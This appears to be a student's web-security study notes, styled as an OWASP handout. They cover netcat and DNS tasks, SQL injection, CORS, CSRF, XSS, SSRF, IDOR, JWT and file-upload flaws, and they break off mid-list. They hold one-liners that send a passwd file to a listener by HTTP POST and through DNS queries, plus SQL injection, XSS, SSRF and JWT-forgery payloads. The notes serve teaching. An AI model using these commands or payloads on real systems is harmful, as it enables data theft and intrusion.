 
# Owasp zere
# OWASP Educational Handout

### Network and Server Tasks

#### 1. Netcat (nc) for Listening and Sending Data
   - **Listen on a Port:**
     ```bash
     nc -l -p 8080
     ```
     This command listens on port `8080` for incoming connections.

   - **Send Data via POST Request:**
     ```bash
     cat passwd | base64 | curl -X POST http://192.168.110.160:8080 -d "$(cat)"
     ```
     - `cat passwd`: Reads the contents of the `passwd` file.
     - `base64`: Encodes the data in Base64.
     - `curl -X POST`: Sends a POST request with the encoded data.

   - **Send Simple Data via POST Request:**
     ```bash
     curl -X POST http://192.168.110.160:8080 -d "data=text"
     ```
     Sends a POST request with the data `data=text`.

   - **Start a Python HTTP Server:**
     ```bash
     python3 -m http.server 8080
     ```
     Starts a simple HTTP server on port `8080`.

---

#### 2. DNS Tasks

   - **Capture DNS Traffic:**
     ```bash
     sudo tcpdump -i eth0 port 53 -n
     ```
     Captures DNS traffic (UDP port 53) on the `eth0` interface.

   - **Edit DNS Configuration:**
     ```bash
     nano /etc/resolv.conf
     ```
     Opens the DNS configuration file for editing.

   - **Send DNS Queries in Parallel:**
     ```bash
     cat passwd | od -A n -t x8 | tr -d " " | xargs -P10 -I {} dig +time=1 +retry=0 {} > /dev/null 2>&1
     ```
     - `od -A n -t x8`: Converts the `passwd` file to 8-byte hexadecimal.
     - `tr -d " "`: Removes all spaces.
     - `xargs -P10`: Runs 10 parallel processes.
     - `dig +time=1 +retry=0 {}`: Sends DNS queries with a timeout of 1 second and no retries.
     - `> /dev/null 2>&1`: Suppresses output.



#### 3. Download Files Task

   - **Download Files from a JSON List:**
     ```bash
     sudo curl https://wordlists-cdn.assetnote.io/data/automated.json | grep -P -o "Download.*?(?=http).*?'" | grep -o -P "http.*(?=')" | xargs -I {} wget {} -P /home/amir/temp/
     ```
     - `curl`: Fetches the JSON file.
     - `grep -P -o "Download.*?(?=http).*?'"`: Extracts URLs from the JSON.
     - `grep -o -P "http.*(?=')"`: Extracts clean URLs.
     - `xargs -I {} wget {} -P /home/amir/temp/`: Downloads files to the specified directory.



#### 4. Virtual Host Configuration

   - **Apache Virtual Hosts:**
     - Edit virtual host configurations:
       ```bash
       nano /etc/apache2/sites-available/config
       ```
     - Disable a site:
       ```bash
       sudo a2dissite config
       ```
     - Enable a site:
       ```bash
       sudo a2ensite config
       ```

   - **Test Virtual Host with cURL:**
     ```bash
     curl -v -i -H "Host: mysite.com" http://192.168.110.160
     ```
     - `-v`: Shows the request details.
     - `-i`: Includes response headers.
     - `-H "Host: mysite.com"`: Sets the `Host` header to simulate a virtual host.


### SQL Injection

#### 1. Basic SQL Injection Queries
   - **List Databases:**
     ```sql
     SELECT schema_name FROM information_schema.schemata;
     ```
   - **List Tables:**
     ```sql
     SELECT table_name FROM information_schema.tables;
     ```
   - **List Columns:**
     ```sql
     SELECT column_name FROM information_schema.columns;
     ```


#### 2. Testing for SQL Injection

   - **Order By Test:**
     ```sql
     1 ORDER BY 1
     sad' ORDER BY 1#
     sad" ORDER BY 1#
     ```
     - Tests if the column count is valid.

   - **Union Injection:**
     ```sql
     ' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables#
     ```
     - Combines results from two queries.

   - **Extract Column Names:**
     ```sql
     ' UNION SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'#
     ```

   - **Extract Data from a Table:**
     ```sql
     ' UNION SELECT 1,username,password,fname,description FROM users#
     ```


#### 3. Boolean-Based Blind SQL Injection

   - **True Condition:**
     ```sql
     ' AND 1=1
     ' AND '1'='1
     ' AND "1"="1"
     ```

   - **False Condition:**
     ```sql
     ' AND 1=2
     ' AND '1'='2
     ' AND "1"="2"
     ```

   - **Time-Based Blind SQL Injection:**
     ```sql
     ' AND SLEEP(10)
     ```

   - **Conditional Checks:**
     ```sql
     AND 1 = IF((SELECT LENGTH(DATABASE()) > 3), 1, 0)
     AND 1 = IF((SELECT LENGTH(DATABASE()) > 4), 1, 0)
     AND 1 = IF((SELECT LENGTH(DATABASE()) > 5), 1, 0)
     ```
     - Tests the length of the database name.


### Summary of Key Points
- **Network Tools:** Use `nc`, `curl`, and `tcpdump` for network tasks.
- **DNS Tasks:** Capture DNS traffic and send parallel queries.
- **File Downloads:** Automate file downloads using `curl`, `grep`, and `wget`.
- **Virtual Hosts:** Configure and test Apache virtual hosts.
- **SQL Injection:** Use `UNION`, `ORDER BY`, and conditional queries to test and exploit SQL injection vulnerabilities.




## Week 2 (5,6,7)

### 1. Comparison of DOM and BOM

  **DOM (Document Object Model):**
  - A programming interface for HTML and XML documents.
  - Creates a tree structure of the page's elements that can be manipulated with JavaScript.
  - Allows developers to change the content, structure, and style of the page.

  **BOM (Browser Object Model):**
  - A programming interface for interacting with the browser.
  - Includes objects like `window`, `navigator`, `screen`, `history`, and `location`.
  - Allows developers to work with browser features such as windows, history, and page location.

  **Comparison:**
  - DOM is related to the page's content, while BOM is related to the browser and its environment.
  - DOM is standardized and defined by W3C, but BOM has no specific standard and may vary between browsers.



### 2. Methods for Sending Requests from the Frontend
  There are several methods for sending requests from the frontend to a server or other resources. Below are some of the most important ones:

  **1. Fetch API**
  - A modern and powerful interface for sending HTTP requests.
  - Supports Promises, making it easier to work with.

      ```javascript
      fetch('https://example.com/data', {
          method: 'GET',
          headers: {
              'Content-Type': 'application/json'
          }
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
      ```

  **2. XMLHttpRequest (XHR)**
  - An older method for sending HTTP requests.
  - Still used in some projects.

      ```javascript
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://example.com/data', true);
      xhr.onreadystatechange = function() {
          if (xhr.readyState === 4 && xhr.status === 200) {
              console.log(JSON.parse(xhr.responseText));
          }
      };
      xhr.send();
      ```

  **3. WebSocket**
  - A two-way (full-duplex) communication protocol between client and server.
  - Suitable for real-time applications like chat or games.
      ```javascript
      const socket = new WebSocket('wss://example.com/socket');
      socket.onopen = function() {
          socket.send('Hello Server!');
      };
      socket.onmessage = function(event) {
          console.log('Message from server:', event.data);
      };
      ```

  **4. Web Messaging (PostMessage)**
  - Used to send messages between windows or iframes with different origins.
      ```javascript
      // Sending a message
      window.postMessage('Hello', 'https://example.com');

      // Receiving a message
      window.addEventListener('message', function(event) {
          if (event.origin === 'https://example.com') {
              console.log('Received message:', event.data);
          }
      });
      ```

  **5. `<img>` Tag**
  - Used to send GET requests indirectly.
  - Commonly used for tracking or fetching images.

      ```html
      <img src="https://example.com/track?user=123" alt="Tracking" />
      ```

  **6. Forms**
  - Sending data via HTML forms using GET or POST methods.
      ```html
      <form action="https://example.com/submit" method="POST">
          <input type="text" name="username" />
          <input type="submit" value="Submit" />
      </form>
      ```

  **7. `<script>` Tag (JSONP)**
  - An older method to bypass Same Origin Policy (SOP) restrictions.
  - Data is sent as JSON wrapped in a callback function.
      ```html
      <script src="https://example.com/data?callback=handleData"></script>
      <script>
          function handleData(data) {
              console.log('Received data:', data);
          }
      </script>
      ```

  **8. Beacon API**
  - Used to send small amounts of data to the server when the page is closed (e.g., for analytics).
      ```javascript
      navigator.sendBeacon('https://example.com/log', 'Data to send');
      ```


### 3. Concept of SameSite in Cookies

  **SameSite:** domain . TLD(ir, com, org, ...)
  - A security feature for cookies that determines whether cookies are sent only in same-site requests.
  - Possible values:
    - **Strict:** Cookies are sent only in same-site requests.
    - **Lax:** Cookies are sent in same-site requests and some cross-site requests (e.g., links).
    - **None:** Cookies are sent in all requests (requires the cookie to be Secure).



### 4. Concept of Origin and Same Origin Policy (SOP)

  **Origin:** protocol :// domain . TLD : Port
  - A combination of protocol (e.g., HTTP or HTTPS), domain, and port.
  - Example: `https://example.com:443`

  **Same Origin Policy (SOP):**
  - A security policy that restricts scripts running on a web page from accessing resources from a different origin.
  - Aims to prevent Cross-Site Scripting (XSS) and other security attacks.

---

### 5. Exceptions to SOP
  **CORS (Cross-Origin Resource Sharing):**
  - A mechanism that allows servers to grant access to their resources to other origins.
  - The server can specify which origins are allowed using the `Access-Control-Allow-Origin` header.

  **JSONP (JSON with Padding):**
  - An older technique to bypass SOP using the `<script>` tag.
  - Data is sent as JSON wrapped in a callback function.

  **Proxy Server:**
  - Using an intermediary server to fetch resources from other origins and serve them to the client.

  **WebSockets:**
  - A protocol for two-way communication between client and server that is not subject to SOP restrictions.



### 6. CORS (Cross-Origin Resource Sharing)
  - CORS is a security mechanism that allows browsers to make controlled cross-origin requests. 
  - It prevents **CSRF** and **XSS** attacks by enforcing rules on how resources are shared between different origins.

  1. The browser sends a **Preflight Request** (an `OPTIONS` request) to the server.  
  2. The server responds with headers like `Access-Control-Allow-Origin` to indicate whether the request is allowed.  
  3. If allowed, the browser sends the actual request.

  **Key CORS Headers**  
    - `Access-Control-Allow-Origin`: Specifies which origins are allowed.  
      - Example: `Access-Control-Allow-Origin: https://example.com`  
      - For all origins: `Access-Control-Allow-Origin: *`  

    - `Access-Control-Allow-Methods`: Specifies allowed HTTP methods.  
      - Example: `Access-Control-Allow-Methods: GET, POST, PUT`  

    - `Access-Control-Allow-Credentials`: Indicates whether credentials (e.g., cookies) can be included.  
      - Example: `Access-Control-Allow-Credentials: true`  
      - if `true` : user can send cookies but if not user cant.

  **Example**  
    **Frontend Request:**  

          ```javascript
          fetch('https://api.example.com/data', {
              method: 'GET',
              credentials: 'include' // Include cookies if needed
          })
          .then(response => response.json())
          .then(data => console.log(data));
          ```
    **Server Response:**  

          Access-Control-Allow-Origin: https://example.com
          Access-Control-Allow-Methods: GET, POST
          Access-Control-Allow-Credentials: true


### 7.Simple vs. Non-Simple Requests in CORS
  - In CORS, requests are categorized into **Simple Requests** and **Non-Simple Requests** based on their characteristics. 
  - This distinction determines whether the browser needs to send a **Preflight Request** (a OPTION request) before making the actual request.

  #### 1. Simple Requests
    - A request is considered **simple** if it meets **all** the following conditions:
    - Conditions for a Simple Request:
        1. **HTTP Method**: One of the following:
          - `GET`
          - `POST`
          - `HEAD`
        2. **Headers**: Only these headers are allowed:
          - `Accept`
          - `Accept-Language`
          - `Content-Language`
          - `Content-Type` (with specific values, see below)
        3. **Content-Type**: Only these values are allowed:
          - `application/x-www-form-urlencoded`
          - `multipart/form-data`
          - `text/plain`
        4. **No Custom Headers**: The request must not include any custom headers (e.g., `Authorization`).

    - Example of a Simple Request:

        ```javascript
        fetch('https://api.example.com/data', {
            method: 'GET',
            headers: {
                'Content-Type': 'text/plain'
            }
        });
        ```

    - What Happens?
      1. The browser sends the request directly **without a Preflight Request**.
      2. The server responds with the appropriate CORS headers (e.g., `Access-Control-Allow-Origin`).


  #### 2. Non-Simple Requests
    - A request is considered **non-simple** if it **does not meet** the conditions for a simple request. For example:

    - Conditions for a Non-Simple Request:
      1. **HTTP Method**: Any method other than `GET`, `POST`, or `HEAD` (e.g., `PUT`, `DELETE`, `PATCH`).
      2. **Custom Headers**: The request includes custom headers (e.g., `Authorization`, `X-Custom-Header`).
      3. **Content-Type**: The `Content-Type` is not one of the allowed values (e.g., `application/json`).

    - Example of a Non-Simple Request:
    
        ```javascript
        fetch('https://api.example.com/data', {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer token'
            },
            body: JSON.stringify({ key: 'value' })
        });
        ```

    - What Happens?
      1. The browser first sends a **Preflight Request** (an `OPTIONS` request) to the server.
      2. The server responds with CORS headers indicating whether the actual request is allowed:
        - `Access-Control-Allow-Origin`
        - `Access-Control-Allow-Methods`
        - `Access-Control-Allow-Headers`
      3. If the Preflight is successful, the browser sends the actual request.


  #### 3. Preflight Request Example
    1. Preflight Request (Browser → Server):

        ```http
        OPTIONS /data HTTP/1.1
        Host: api.example.com
        Origin: https://example.com
        Access-Control-Request-Method: PUT
        Access-Control-Request-Headers: Content-Type, Authorization
        ```

    2. Preflight Response (Server → Browser):

        ```http
        HTTP/1.1 200 OK
        Access-Control-Allow-Origin: https://example.com
        Access-Control-Allow-Methods: PUT
        Access-Control-Allow-Headers: Content-Type, Authorization
        ```

    3. Actual Request (Browser → Server):

        ```http
        PUT /data HTTP/1.1
        Host: api.example.com
        Origin: https://example.com
        Content-Type: application/json
        Authorization: Bearer token
        { "key": "value" }
        ```

  #### 4. Common Issues
    - *Preflight Fails*: If the server doesn't respond correctly to the Preflight Request, the actual request won't be sent.
    - *Missing Headers*: Ensure the server includes the correct CORS headers (e.g., `Access-Control-Allow-Origin`).



### 8.CORS Misconfiguration Vulnerability 
  - CORS misconfigurations occur when servers are improperly set up, allowing unauthorized or overly permissive cross-origin requests.
  - This can expose sensitive data or enable attacks.

  #### 1. Common Misconfigurations
    - **Wildcard Origin**: `Access-Control-Allow-Origin: *` allows any website to access your resources.
    - **Reflecting Origin**: Server blindly reflects the `Origin` header without validation.
    - **Credentials with Wildcard**: Using `Access-Control-Allow-Credentials: true` with `Access-Control-Allow-Origin: *` (browsers block this, but misconfigurations can still occur).

  #### 2. risk
    - when :
      1. Can bypass Origin limit and have ACAC (Access-Control-Allow-Credentials)
      2. Endpoint works with cookie with none samesite
      attacker can get user data on website by forcing user to run a JS code on his Browser.

  #### 3. Prevention
    - **Validate Origins**: Allow only trusted origins.

          ```javascript
          const allowedOrigins = ['https://example.com'];
          if (allowedOrigins.includes(req.headers.origin)) {
              res.header('Access-Control-Allow-Origin', req.headers.origin);
          }
          ```
    - **Avoid Wildcard**: Never use `Access-Control-Allow-Origin: *` unless absolutely necessary.
    - **Secure Preflight**: Validate methods and headers in Preflight Requests.
    - **Limit Exposed Headers**: Only expose necessary headers.


### 9.CSRF 
  #### What is CSRF?
  - Cross-Site Request Forgery (CSRF) is an attack that tricks the user into executing unwanted actions on a different website where they are authenticated. 
  - This can lead to unauthorized actions being performed on behalf of the user.
  - There is no need to have CORS access. most of the times we don't need output (adding user , removing post, ...)
  
  #### How CSRF Works
  1. A user logs into a web application and receives an authentication cookie.
  2. The user visits a malicious website that contains a script or form.
  3. The malicious site sends a request to the web application using the user's credentials without their consent.

  #### Prevention Techniques
  - **Use Anti-CSRF Tokens**: Generate a unique token for each user session and validate it with each state-changing request.
  - **SameSite Cookies**: Set the `SameSite` attribute on cookies to prevent them from being sent with cross-origin requests.
  - **Check Referer Header**: Validate the `Referer` header to ensure requests are coming from trusted sources.
  - **Convert Requests to Non-Simple**: Make requests non-simple by adding custom headers or using JSON data type, which triggers a preflight request due to CORS policy.


### 10.XSS (Cross-Site Scripting)
  - XSS is a security vulnerability that allows attackers to inject malicious scripts (usually JavaScript) into web pages. 
  - These scripts execute in the victim's browser and can steal sensitive data (like cookies, tokens) or perform malicious actions.
  - It can bypass CSRF token by reading DOM
  - If XSS is injected, the attacker can perform any action that the victim can perform.


  #### Types of XSS

    1. Reflected XSS
      - **How it works**: The attacker sends a malicious link containing a script to the victim. When the victim clicks the link, the script executes in their browser.
      - **Example**:
        - Malicious link:  
          `https://example.com/search?q=<script>alert('XSS')</script>`
        - If the server reflects the input without validation, the script executes.

    2. Stored XSS
      - **How it works**: The attacker stores a malicious script on the server (e.g., in comments or user profiles). The script executes every time the page is loaded.
      - sometimes doing with CSRF
      - **Example**:
        - Attacker submits a comment with a script:  
          `<script>alert('XSS')</script>`
        - Every user who views the comment page executes the script.

    3. DOM-based XSS
      - **How it works**: The vulnerability exists in client-side JavaScript. The attacker manipulates the DOM to execute malicious scripts.
      - **Example**:
        - Vulnerable JavaScript code:
          ```javascript
          document.getElementById('output').innerHTML = location.hash.substring(1);
          ```
        - Attacker injects a script via the URL:  
          `https://example.com/#<script>alert('XSS')</script>`


  #### Preventing XSS

    1. *Input Validation and Sanitization*
      - Validate and sanitize all user inputs (forms, URLs, headers).
      - Use libraries like **DOMPurify** to sanitize HTML.

    2. *Output Encoding*
      - Encode user data before displaying it in HTML to prevent script execution.
      - Example (in PHP):
        ```php
          echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
        ```

    3. *Use Content Security Policy (CSP)*
      - Restrict allowed sources for scripts using CSP.
      - Example:
        ```http
        Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
        ```

    4. *Secure Cookies*
      - Mark cookies with `HttpOnly` and `Secure` flags to prevent JavaScript access.
      - Example:
        ```http
        Set-Cookie: sessionId=abc123; HttpOnly; Secure
        ```

## Week 3 (8,9,10)

### 1.open redirect
  - This is a type of vulnerability in web applications where an attacker can manipulate a URL to redirect users to an arbitrary, potentially malicious website.
  - This occurs when a web application accepts user input to determine the destination of a redirect without properly validating or restricting the input.

  #### How It Works:
    1. **Redirect Mechanism**: Many web applications use redirects to send users to different pages, often based on parameters in the URL (e.g., `?redirect=https://example.com`).
    2. **Lack of Validation**: If the application does not validate or restrict the redirect URL, an attacker can craft a URL that redirects users to a malicious site.
    3. **Exploitation**: An attacker can trick users into clicking a link that appears legitimate but redirects them to a phishing site, malware, or other harmful content.

  #### Risks:
    - **Phishing Attacks**: Attackers can use open redirects to make phishing links appear more legitimate by hiding them behind a trusted domain.
    - **Malware Distribution**: Users may be redirected to sites hosting malware.
    - **XSS**: It can leveraged XSS


### 2.Verb Tampering 
  - This is a type of security vulnerability where an attacker attempts to manipulate HTTP methods (such as GET, POST, PUT, DELETE, etc.) to trigger unexpected behavior on the server. 
  - This vulnerability can lead to unauthorized access, data manipulation, or even the execution of malicious code.

  #### Explanation of Verb Tampering:
    In the HTTP protocol, different methods are used for specific actions. For example:

    **GET**: Used to request data from the server.
    **POST**: Used to send data to the server.
    **PUT**: Used to update data on the server.
    **DELETE**: Used to delete data from the server.

  - In some cases, servers do not properly validate HTTP methods, which may allow unauthorized or unexpected methods to be executed.
  - This weakness can be exploited by attackers to access functionalities that should not be available.

  #### Examples of Verb Tampering:
    1. Changing GET to POST:
      Suppose there is a login form that uses the POST method. If the server does not properly validate the methods, an attacker could change the method to GET, sending sensitive data in the URL, which might then be logged on the server.
    2. Using PUT or DELETE Methods:
      If the server mistakenly allows PUT or DELETE methods, an attacker could upload new files to the server or delete existing ones.

  


### 3.Force Browsing
  - Force Browsing is an attack where a malicious user manually guesses or manipulates URLs to access restricted resources, bypassing access controls. 
  - It targets poorly secured files, directories, or endpoints.  

  #### Examples  
  - Accessing admin panels: `/admin`  
  - Downloading sensitive files: `/backup.zip`  
  - Viewing unauthorized user data: `/user/profile?userId=1234`  

  #### Prevention  
  1. Implement strict access controls for all resources.  
  2. Validate user authorization for every request.  
  3. Disable directory listing and remove sensitive files from public access.  
  4. Use strong, non-guessable naming for files/directories.  
  5. Monitor logs for unusual access patterns.  

  #### Tools for Force Browsing
  - **ffuf**: Directory and file brute-forcing.  
  - **Gobuster**: Brute-forcing web paths and files.  
  - **Dirb/Dirbuster**: Directory discovery.  
  - **Burp Suite**: For manual and automated testing.  



### 4.FFUF Overview
  - FFUF is designed to fuzz web applications by sending a large number of requests with varying inputs (e.g., URLs, parameters, headers) to discover hidden resources, misconfigurations, or vulnerabilities.
  - It is highly customizable and supports multi-threading, making it one of the fastest fuzzing tools available.

---

  #### How FFUF Can Be Used for Forced Browsing and Verb Tampering:
  1. **Directory and File Discovery**:
    - FFUF can be used to brute-force directories and files on a web server by trying common or custom wordlists.
    - Example:
      ```bash
      ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ
      ```
      Here, `FUZZ` is a placeholder that FFUF replaces with entries from the wordlist.

  2. **Parameter Fuzzing**:
    - FFUF can fuzz parameters in URLs to discover hidden or sensitive endpoints.
    - Example:
      ```bash
      ffuf -w /path/to/wordlist.txt -u https://example.com/page?param=FUZZ
      ```

  3. **Verb Tampering**:
    - FFUF can be used to test different HTTP methods (e.g., GET, POST, PUT, DELETE) to see how the server responds.
    - Example:
      ```bash
      ffuf -X PUT -u https://example.com/resource
      ```
      This tests if the server allows the `PUT` method on a specific resource.

  4. **Subdomain Enumeration**:
    - FFUF can also be used to discover subdomains by fuzzing the DNS records.
    - Example:
      ```bash
      ffuf -w /path/to/subdomains.txt -u https://FUZZ.example.com
      ```
  5. **File Fuzzing**:
    - FFUF can also be used to discover File to discover hidden or sensitive files.
    - Example:
      ```bash
      ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .sql
      ```


  #### Key Features of FFUF:
  - **Speed**: FFUF is optimized for performance and can handle thousands of requests per second.
  - **Flexibility**: It supports custom wordlists, filters, and output formats.
  - **Filters**: You can filter responses based on status codes, response size, or regex patterns.
  - **Recursion**: FFUF can recursively fuzz directories to discover nested resources.
  - **Proxy Support**: It can be used with proxies for debugging or anonymity.

  #### Example Use Case for Forced Browsing:
  Suppose you want to discover hidden directories on a target website:
  1. Download or create a wordlist (e.g., `common_dirs.txt`).
  2. Run FFUF:
    ```bash
    ffuf -w common_dirs.txt -u https://example.com/FUZZ
    ```
  3. Analyze the results to identify accessible directories or files.



### 5.S3 Bucket Misconfiguration
 - Misconfigured Amazon S3 buckets can lead to sensitive data exposure, unauthorized access, or unintended data leaks. 
 - This happens when S3 bucket permissions are overly permissive or improperly set.
 - firt dig the website domain and if a you found CNAME with .....amazonaws.com you and bucket misconfigured. then you can see the list of files with deleting -website from main url.



 ### 6.SSRF (Server-Side Request Forgery)
  - is a critical web security vulnerability that allows an attacker to make the server perform unauthorized requests to internal or external resources. 
  - This can lead to sensitive data exposure, internal network access, or even remote code execution.

  #### How SSRF Works:
  1. **Exploiting Server-Side Requests**:
    - The attacker tricks the server into making requests to internal services (e.g., databases, APIs) or external systems.
    - Example: A web application fetches data from a user-supplied URL (e.g., `https://example.com/fetch?url=http://internal-service`).

  2. **Bypassing Security Controls**:
    - The server may have access to resources that are not directly accessible to the attacker (e.g., internal networks, cloud metadata services).

  3. **Impact**:
    - Access to sensitive data (e.g., credentials, configuration files).
    - Exploitation of internal services (e.g., databases, caches).
    - Remote code execution in some cases.

  #### Common SSRF Scenarios:
  1. **Cloud Metadata Services**:
    - Exploiting cloud metadata endpoints (e.g., AWS EC2 metadata service at `http://169.254.169.254`).
    - Example: Fetching IAM credentials from the metadata service.
  2. **Internal Network Access**:
    - Accessing internal services (e.g., databases, admin panels) via the server.
  3. **Port Scanning**:
    - Using the server to scan internal or external ports.
  4. **File Inclusion**:
    - Reading local files using `file://` protocol (e.g., `file:///etc/passwd`).


  #### Protocols Commonly Exploited in SSRF:
  1. **HTTP/HTTPS**:
    - The most common protocol used in SSRF attacks.
    - Example: Fetching internal resources like `http://localhost/admin` or `http://169.254.169.254/latest/meta-data/`.

  2. **File Protocol (`file://`)**:
    - Allows reading local files on the server.
    - Example: `file:///etc/passwd` to read the password file on a Unix-based system.

  3. **FTP Protocol (`ftp://`)**:
    - Used to access files on FTP servers.
    - Example: `ftp://attacker.com/malicious-file` to fetch a malicious file.

  4. **Gopher Protocol (`gopher://`)**:
    - A powerful protocol that can be used to send custom TCP packets.
    - Example: Exploiting Redis or Memcached services by crafting malicious payloads.

  5. **DNS Protocol (`dns://`)**:
    - Can be used to perform DNS lookups or exfiltrate data via DNS queries.
    - Example: `dns://attacker.com` to trigger a DNS query.

  6. **LDAP Protocol (`ldap://` or `ldaps://`)**:
    - Used to interact with LDAP servers.
    - Example: `ldap://internal-ldap-server` to query internal directory services.

  7. **Redis Protocol (`redis://`)**:
    - Used to interact with Redis databases.
    - Example: `redis://localhost:6379` to execute commands on a Redis server.

  8. **SMTP Protocol (`smtp://`)**:
    - Used to send emails via SMTP servers.
    - Example: `smtp://internal-smtp-server` to send malicious emails.

  9. **SSH Protocol (`ssh://`)**:
    - Used to interact with SSH servers.
    - Example: `ssh://internal-ssh-server` to attempt SSH connections.


  #### How Protocols Are Exploited in SSRF:
  1. **Internal Resource Access**:
    - Attackers use protocols like `http://` or `file://` to access internal resources (e.g., databases, configuration files).

  2. **Data Exfiltration**:
    - Protocols like `dns://` or `ftp://` can be used to exfiltrate data to an attacker-controlled server.

  3. **Remote Code Execution**:
    - Protocols like `gopher://` or `redis://` can be used to execute commands on internal services.

  4. **Port Scanning**:
    - Attackers can use the server to scan internal or external ports by manipulating protocols.



## Week 4 (11,12,13,14)
### 1.IDOR (Insecure Direct Object References) 
- is a common web application vulnerability that occurs when an application exposes a reference to an internal object (e.g., a file, database record, or resource) without proper authorization checks. 
- This allows attackers to manipulate these references to access unauthorized data or perform unauthorized actions.

  #### How IDOR Works:
  1. **Direct Object Reference**:
    - The application uses user-supplied input (e.g., an ID, filename, or key) to access an object directly.
    - Example: `https://example.com/profile?id=123`.

  2. **Lack of Authorization**:
    - The application fails to verify if the user is authorized to access the requested object.

  3. **Exploitation**:
    - An attacker modifies the reference (e.g., changing `id=123` to `id=124`) to access another user's data.

  #### Common Examples of IDOR:
  1. **User Profiles**:
    - Accessing another user's profile by changing the user ID in the URL.
    - Example: `https://example.com/profile?id=123` → `https://example.com/profile?id=124`.

  2. **File Access**:
    - Downloading files by manipulating file names or IDs.
    - Example: `https://example.com/download?file=report.pdf` → `https://example.com/download?file=secret.pdf`.

  3. **Database Records**:
    - Accessing database records by modifying record IDs.
    - Example: `https://example.com/order?id=1001` → `https://example.com/order?id=1002`.

  4. **API Endpoints**:
    - Exploiting APIs that expose object references without proper checks.
    - Example: `GET /api/users/123` → `GET /api/users/124`.



### 2.JWT (JSON Web Token) 
  - is a compact, URL-safe token format used for securely transmitting information between parties as a JSON object. 
  - It is commonly used for authentication and authorization in web applications. 
  - However, if not implemented correctly, JWTs can introduce security vulnerabilities.

  #### Structure of a JWT:
  - A JWT consists of three parts separated by dots (`.`):
  1. **Header**:
    - Contains metadata about the token, such as the signing algorithm (e.g., `HS256`, `RS256`).
    - Example:
      ```json
      {
        "alg": "HS256",
        "typ": "JWT"
      }
      ```

  2. **Payload**:
    - Contains claims (e.g., user ID, roles, expiration time).
    - Example:
      ```json
      {
        "sub": "1234567890",
        "name": "John Doe",
        "admin": true,
        "exp": 1516239022
      }
      ```

  3. **Signature**:
    - Used to verify the *integrity* of the token.
    - Created by signing the encoded header and payload with a secret key or private key.


  #### Common JWT Vulnerabilities:
    1. **None Algorithm**:
      - Some libraries support the `none` algorithm, which means no signature is required.
      - Attackers can modify the token and set the algorithm to `none` to bypass signature verification.
    2. **Weak Secret Keys**:
      - Using weak or predictable secret keys makes it easier for attackers to brute-force the signature.
    3. **Algorithm Confusion**:
      - If the server does not explicitly specify the expected algorithm, attackers can switch between symmetric (e.g., `HS256`) and asymmetric (e.g., `RS256`) algorithms to forge tokens.
    4. **Token Expiry**:
      - Missing or improperly implemented expiration (`exp`) claims can allow tokens to be used indefinitely.
    5. **Sensitive Data in Payload**:
      - Storing sensitive data (e.g., passwords, API keys) in the payload can lead to data exposure if the token is intercepted.
    6. **Lack of Audience Validation**:
      - Failing to validate the `aud` (audience) claim can allow tokens to be used across different applications.


  #### Prevention Measures:
    1. **Use Strong Secret Keys**: Use cryptographically secure random keys for signing tokens.
    2. **Disable the `none` Algorithm**: Ensure your JWT library rejects tokens with the `none` algorithm.
    3. **Validate the Algorithm**: Explicitly specify and validate the expected signing algorithm.
    4. **Set Expiration Time**: Always include and validate the `exp` claim to ensure tokens expire.
    5. **Validate Claims**: Verify claims like `iss` (issuer), `aud` (audience), and `sub` (subject).
    6. **Use HTTPS**: Always transmit JWTs over HTTPS to prevent interception.
    7. **Store Tokens Securely**: Store JWTs securely on the client side (e.g., in `HttpOnly` cookies).
    8. **Rotate Keys**: Regularly rotate signing keys to mitigate the impact of key compromise.


  #### Tools for Testing JWT Security:
    1. **jwt.io**: A popular tool for decoding and debugging JWTs.
    2. **Burp Suite**: Use the *JWT Editor* extension to manipulate and test JWTs.
    3. **jwt_tool**: A command-line tool for testing JWT vulnerabilities.

  #### Example of JWT Exploitation:
    1. **None Algorithm Attack**:
      - Original Token:
        ```
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        ```
      - Modified Token (Algorithm set to `none`):
        ```
        eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
        ```
    2. **Mitigation**:
      - Ensure your JWT library rejects tokens with the `none` algorithm.

### 3.File Upload Vulnerabilities
  - occur when a web application allows users to upload files without proper validation, filtering, or security controls.
  -  Attackers can exploit this functionality to upload malicious files, execute arbitrary code, or compromise the server.
  
  #### Common Risks of File Upload Vulnerabilities:
    1. **Malware Upload**:
      - Attackers can upload malicious files (e.g., viruses, trojans) to the server.

    2. **Remote Code Execution (RCE)**:
      - Uploading executable files (e.g., `.php`, `.jsp`) can allow attackers to execute arbitrary code on the server.

    3. **Denial of Service (DoS)**:
      - Uploading large files or filling up disk space can crash the server or disrupt services.

    4. **Upload Frontend Scripts**:
      - HTML or SVG files can be used to injects JS script for XSS attacks.

    5. **Defacement**:
      - Attackers can overwrite or replace legitimate files with malicious content.

  #### Common Exploitation Techniques:
    1. **File Type Bypass**:
      - Attackers bypass file type restrictions by modifying file extensions or MIME types.
      - Example: Renaming a `.php` file to `.jpg.php`.

    2. **Altenative Extensions** 
      -Uploading files with alrenative formats like : `.phar` or `phtml`

    3. **File Name Bypass**:
      - Adding null bytes (`#`) to truncate the file extension during validation like `malicious.php#.jpg`.
      - Adding null bytes (`%00`) or (`%0a`) to truncate the file extension during validation like `malicious.php%00.jpg`.

    4. **File Content Manipulation**:
      - Embedding malicious code within seemingly harmless files (e.g., images with embedded PHP code) and Bypassing *Magic bytes chack*.

    5. **Path Traversal**:
      - Uploading files to unintended directories by manipulating file paths.
      - Example: `../../malicious.php`.

  #### Prevention Measures:
    1. **Validate File Types**:
